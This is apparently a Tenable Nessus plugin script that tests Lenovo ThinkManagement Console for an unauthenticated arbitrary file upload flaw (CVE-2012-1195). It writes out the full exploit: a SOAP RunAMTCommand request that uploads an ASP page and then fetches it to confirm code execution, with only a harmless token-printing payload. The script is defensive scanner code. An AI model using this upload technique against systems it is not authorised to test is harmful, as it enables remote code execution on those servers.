#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(58654);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2017/05/16 19:43:12 $");

  script_cve_id("CVE-2012-1195");
  script_bugtraq_id(52023);
  script_osvdb_id(79276);
  script_xref(name:"EDB-ID", value:"18622");
  script_xref(name:"EDB-ID", value:"18623");
  script_xref(name:"Secunia", value:"47666");

  script_name(english:"Lenovo ThinkManagement Console RunAMTCommand Operation -PutUpdateFileCore Command Parsing Arbitrary File Upload");
  script_summary(english:"Attempts to upload and execute an ASP script.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts an application that allows arbitrary code
execution.");
  script_set_attribute(attribute:"description", value:
"The version of Lenovo ThinkManagement Console hosted on the remote
web server contains a flaw in the 'ServerSetup.asmx' script that
allows a remote, unauthenticated attacker to upload and run arbitrary
ASP scripts with the privileges of the web user.

In addition, this version of Lenovo ThinkManagement Console may be
affected by a file deletion vulnerability.  However, Nessus has not
tested for this.");

  script_set_attribute(attribute:"solution", value:"Contact the vendor for patches.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploithub_sku", value:"EH-12-326");
  script_set_attribute(attribute:"exploit_framework_exploithub", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Lenovo ThinkManagement Console 9.0.3 File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'LANDesk Lenovo ThinkManagement Console Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'White_Phosphorus');

  # nb: credentials are required to access this link.
  script_set_attribute(attribute:"see_also", value:"https://community.landesk.com/docs/DOC-24787");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/02/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/02/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/04/10");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:landesk:lenovo_thinkmanagement_console");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("lenovo_thinkmanagement_console_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/thinkmanagement_console");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

global_var port;

function call(cmd, url, xml)
{
  local_var hdrs, soap;

  # Add the SOAP wrapper to the XML.
  soap =
    '<?xml version="1.0" encoding="utf-8"?>
     <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
       <soap:Body>' + xml + '</soap:Body>
     </soap:Envelope>';

  # Upload our ASP file.
  hdrs = make_array(
    "Content-Type", "text/xml; charset=utf-8",
    "SOAPAction", '"http://tempuri.org/' + cmd + '"'
  );

  return http_send_recv3(
    port         : port,
    method       : "POST",
    item         : url,
    data         : soap,
    add_headers  : hdrs,
    exit_on_fail : TRUE
  );
}

# Get details of ThinkManagement Console.
port = get_http_port(default:80);
install = get_install_from_kb(appname:"thinkmanagement_console", port:port, exit_on_fail:TRUE);
dir = install["dir"];

# Generate a filename for the ASP page that we're uploading.
filename = "nessus-" + (SCRIPT_NAME - ".nasl") + "-" + unixtime() + ".asp";

# Generate a random token which we expect the payload to print.
token = rand();

# During testing it was found that the responses can take more than
# two times the default timeout, so make Nessus be patient.
http_set_read_timeout(get_read_timeout() * 5);

# The original PoC used WshShell, but neither that nor filesystem
# operations were available by default on the test system.
#
# We just want it to print a random number back.
payload =
  '&lt;%\r\n' +
  '\r\n' +
  '\'This file is generated by the Nessus plugin ' + SCRIPT_NAME + '.\r\n' +
  '\'It can be safely deleted once the Nessus scan is completed.\r\n' +
  '\r\n' +
  'Response.Write("' + token + '")\r\n' +
  '\r\n' +
  '%&gt;\r\n';

xml =
  '<RunAMTCommand xmlns="http://tempuri.org/">
     <Command>-PutUpdateFileCore</Command>
     <Data1></Data1>
     <Data2>ldlogon/vulscanresults/' + filename + '</Data2>
     <Data3>' + payload + '</Data3>
     <ReturnString></ReturnString>
   </RunAMTCommand>';

url = dir + "/landesk/managementsuite/core/core.anonymous/ServerSetup.asmx";
res = call(cmd:"RunAMTCommand", url:url, xml:xml);

if ('<RunAMTCommandResult>1084</RunAMTCommandResult>' >!< res[2])
  exit(0, "Failed to upload ASP script using the ThinkManagement Console at " + build_url(port:port, qs:url) + ", indicating that the install is not affected.");

# Save the request to display in the report.
req = http_last_sent_request();

# Execute our ASP file.
url = dir + "/ldlogon/vulscanresults/" + filename;
res = http_send_recv3(
  port         : port,
  method       : "GET",
  item         : url,
  exit_on_fail : TRUE
);

# Check if the execution worked.
if (res[2] != token)
  exit(0, "Failed to execute ASP script at " + build_url(port:port, qs:url) + ", indicating that the install is not affected.");

# Report our findings.
report = NULL;
if (report_verbosity > 0)
{
  report =
    '\nNessus was able to upload and execute an ASP script on the remote host. The' +
    '\nfollowing HTTP request was used to perform the upload :'+
    '\n' +
    '\n  ' + join(split(req, sep:'\r\n', keep:FALSE), sep:'\n  ') +
    '\n' +
    '\nNessus cannot remove the ASP script that it uploaded. It is recommended that' +
    '\nyou delete it yourself. The file can be found at :' +
    '\n' +
    '\n  LANDesk\\ManagementSuite\\ldlogon\\vulscanresults\\' + filename +
    '\n';
}
security_hole(port:port, extra:report);
